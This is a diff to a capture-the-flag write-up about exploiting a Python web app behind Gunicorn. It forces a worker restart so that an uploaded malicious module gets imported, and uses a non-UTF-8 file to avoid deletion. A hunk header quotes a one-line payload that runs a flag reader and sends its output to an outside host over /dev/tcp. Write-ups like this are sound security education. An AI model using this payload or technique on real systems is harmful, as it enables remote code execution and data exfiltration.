@@ -53,7 +53,7 @@ __import__('os').system('bash -c "/readflag>/dev/tcp/bookgin.tw/80"')
 
 However, because the web server is using Gunicorn. Gunicorn uses pre-fork worker model to launch workers. The pypng module has already been loaded. Unless we manually reload it or restart the python process, it will not import the file under `png` in current work directory.
 
-In fact, Gunicorn will monitor its worker processes. If the worker is not responsive or stuck somehow, by default [it will await 30 seconds](http://docs.gunicorn.org/en/stable/settings.html#timeout) and then restart the worker. You can notify the process id is different.
+In fact, Gunicorn will monitor its worker processes. If the worker is not responsive or stuck somehow, by default [it will await 30 seconds](http://docs.gunicorn.org/en/stable/settings.html#timeout) and then restart the worker. You can notice the process id here is different.
 
 ```
 [2019-10-07 12:36:04 +0800] [23271] [INFO] Starting gunicorn 19.9.0
@@ -68,7 +68,7 @@ In fact, Gunicorn will monitor its worker processes. If the worker is not respon
 [2019-10-07 12:37:06 +0800] [23825] [INFO] Waiting for application startup.
 ```
 
-Hence we have to find an approach to make the server stuck for more than 30 seconds. The server source code strictly truncates the filename and file content. Nginx also has also set a limitation 1M for the uploaded file size. It's too difficult to upload a huge file to make the server stuck. However, in this function:
+Hence we have to find an approach to make the server stuck for more than 30 seconds. The server source code strictly truncates the filename and file content. Nginx also has also been set a limitation 1M for the uploaded file size. It's too difficult to upload a huge file to make the server stuck. However, in this function:
 
 ```python
 def sanitize_filename(dangerous_filename):
@@ -93,7 +93,7 @@ def render(filename):
         text2image.render(text, f)
 ```
 
-To exploit, we can upload a non-UTF-8 Python file with [explicit declaration of encoding](https://www.python.org/dev/peps/pep-0263/#id8). Race condition should also work here but it's less stable. The full exploit is in `exploit`.
+To exploit, we can upload a non-UTF-8 Python file with [explicit declaration of encoding](https://www.python.org/dev/peps/pep-0263/#id8). Because this line `with open(src, 'r') as f:` does not specify the encoding, it will fail to decode as UTF-8 and throw an exception. Thus the file will not be deleted. Race condition should also work here but it's less stable. The full exploit is in the `exploit` directory.
 
 ## Postscript
 
